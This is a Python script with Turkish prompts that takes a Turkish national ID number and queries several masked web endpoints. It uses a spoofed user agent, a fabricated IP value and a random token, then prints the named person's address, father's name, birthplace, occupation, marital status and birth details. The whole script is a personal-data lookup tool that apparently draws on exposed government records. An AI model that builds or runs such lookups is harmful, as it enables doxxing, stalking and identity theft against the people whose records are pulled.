import urllib.request, json 
import colors
from datetime import datetime
import time
import random
import os
from fake_useragent import UserAgent

while True:


    chars = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    tokenKey =""
    user_agent = UserAgent().random
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    url = "*****************************************************************************"
    b = "********="
    c = str(random.randint(1950, 2000))
    d = "********"
    a = input(colors.yellow('tc kimlik?(çıkış q bas):'))
    for token in range(175):
      tokenKey += random.choice(chars)
  
    if a == "q":
        print(colors.red("çıkılıyor..."))
        break
    if len(a) == 11:
        print("bekle..", a)
        print(colors.red("#"*60))
        url = urllib.request.urlopen(url + a + b + c + d)
        data = json.load(url) 
        
        url2 = os.popen("""curl --silent -X POST \
         https://*****************************************************************************\
         -H 'accept: application/json, text/javascript, */*; q=0.01' \
         -H 'cache-control: no-cache' \
         -H 'content-type: application/json; charset=UTF-8' \
         -H 'dnt: 1' \
         -H 'origin: h***************************************************************************** \
         -H 'user-agent: %s' \
         -H 'x-requested-with: ****' \
         -d '*****************************************************************************'""" % (user_agent,a,ip,tokenKey)).read()
        url2_json = json.loads(url2)

        url3 = os.popen('''curl --silent -XPOST ' + a + "'" + """*****************************************************************************""").read()
        url3_json = json.loads(url3)
        timestamp = str(url3_json["dogum_tarih"])


        print(colors.cyan('ad: '+ data["results"]["kullaniciAdi"]))
        print(colors.cyan('tc: ' + str(data["results"]["tcNo"])))
        print(colors.cyan('aile sıra no: ' + str(data["results"]["aileSiraNo"])))
        print(colors.cyan('cilt no: ' + str(data["results"]["ciltNo"])))
        print(colors.cyan('sıra no: ' + str(data["results"]["siraNo"])))
        print(colors.cyan('dogum yılı: ' + str(data["results"]["dogumYili"])))
        print(colors.cyan('cinsiyet: ' + str(data["results"]["cinsiyet"])))
        print(colors.cyan('adres: ' + url2_json["adres"]))
        print(colors.cyan('*adres2: ' + str(url3_json["yildizli_adres"])))
        print(colors.cyan('*baba adı: ' + str(url3_json["baba"])))
        print(colors.cyan('dogum yeri: ' + str(url3_json["dogumyeri"])))
        print(colors.cyan('meslek: ' + str(url3_json["neci"])))
        print(colors.cyan('medeni durumu: ' + str(url3_json["medeni"])))
        print(colors.cyan('dogum tarih, saat: ' + time.ctime(int(str(timestamp[:-3])))))
        print(colors.red("#"*60))
    else:
        print(colors.red("yanlış giriyorsun!..."))
